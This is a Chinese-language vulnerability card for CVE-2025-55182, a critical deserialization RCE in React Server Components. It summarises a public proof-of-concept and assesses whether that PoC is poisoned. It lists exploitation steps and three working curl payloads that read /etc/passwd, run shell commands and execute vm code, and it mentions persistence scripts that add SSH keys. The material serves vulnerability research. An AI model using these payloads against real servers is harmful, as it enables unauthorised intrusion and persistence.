## CVE-2025-55182 - React Server Components (react-server-dom-webpack) 不安全反序列化导致的远程代码执行(RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 不安全反序列化导致的远程代码执行(RCE)

**影响应用:** React Server Components (react-server-dom-webpack)

**危害等级:** Critical

**CVSS评分:** 10.0

**影响版本:** 19.0 to 19.2.0

**利用条件:** 未经授权的远程攻击者可利用，需要网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2025-55182是一个存在于React Server Components (特别是react-server-dom-webpack)中的严重漏洞，允许未经身份验证的远程攻击者执行代码。该漏洞的根本原因是由于不安全的反序列化过程，攻击者可以构造恶意请求，利用JavaScript原型链污染或其他的反序列化漏洞来执行任意代码。根据公开信息，该漏洞的CVSS评分高达10.0，表明其严重性和潜在影响。

POC代码分析:
提供的POC包含利用该漏洞所需的必要组件。它模拟了一个webpack打包环境，其中包含了常见的模块，如fs、child_process和vm。该POC的核心在于模拟易受攻击的服务器（src/server-realistic.js），并提供了一组利用脚本（exploit-rce-v4.js、exploit-all-gadgets.js、exploit-persistence.js）。

利用步骤:
1.  **环境搭建**: 首先，需要安装POC中提供的依赖（npm install）。
2.  **启动易受攻击的服务器**: 运行npm start命令启动模拟的易受攻击的服务器(默认端口3002)。
3.  **执行利用脚本**: 运行npm run exploit，该脚本使用vm#runInThisContext来执行任意代码。POC还提供了其他的利用脚本，例如npm run exploit:all，用于测试所有可用的gadget，以及npm run exploit:persistence，用于执行持久化攻击（例如，添加SSH密钥或修改.bashrc文件）。
4.  **通过curl测试**: 可以使用curl命令来模拟POST请求，触发漏洞。例如，可以使用以下命令来测试文件读取、命令执行和vm代码执行：
    *   `curl -X POST http://localhost:3002/formaction -F '$ACTION_REF_0=' -F '$ACTION_0:0={"id":"fs#readFileSync","bound":["/etc/passwd","utf8"]}'`（读取文件）
    *   `curl -X POST http://localhost:3002/formaction -F '$ACTION_REF_0=' -F '$ACTION_0:0={"id":"child_process#execSync","bound":["whoami"]}'`（命令执行）
    *   `curl -X POST http://localhost:3002/formaction -F '$ACTION_REF_0=' -F '$ACTION_0:0={"id":"vm#runInThisContext","bound":["1+1"]}'`（VM代码执行）

POC有效性分析: 该POC的质量很高，因为它提供了一个完整的利用链，从模拟易受攻击的环境到执行任意代码。通过提供的curl命令，可以轻松验证漏洞的存在。该POC还考虑到了实际的webpack打包环境，这使得它更具现实意义。该漏洞利用了JavaScript原型链的特性，可以通过POST请求修改对象的constructor属性，从而达到RCE的目的。

投毒风险分析:
该POC的投毒风险较低。主要原因如下:
1. 代码清晰: POC代码结构清晰，易于理解，没有明显的混淆或隐藏的恶意行为。
2. 标准库: POC主要使用标准的JavaScript库和Node.js模块，例如fs、child_process和vm。没有发现使用不常见的或可疑的第三方库。
3. 无外部脚本: POC不依赖于任何外部脚本或远程资源，这意味着攻击者无法通过修改外部资源来注入恶意代码。
4. 依赖明确: 依赖项在package.json文件中明确声明，没有隐藏的依赖项。
5.  Payload可见: 攻击payload（例如，要执行的命令或要读取的文件）在curl请求中清晰可见，没有隐藏或加密的payload。

虽然POC本身没有明显的投毒风险，但重要的是要注意，攻击者可以修改POC以包含恶意代码。例如，攻击者可以修改利用脚本以执行恶意命令或下载并执行恶意文件。因此，在使用POC时，务必仔细检查代码，并确保从受信任的来源获取POC。

**项目地址:** https://github.com/0x7556/CVE-2025-55182

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
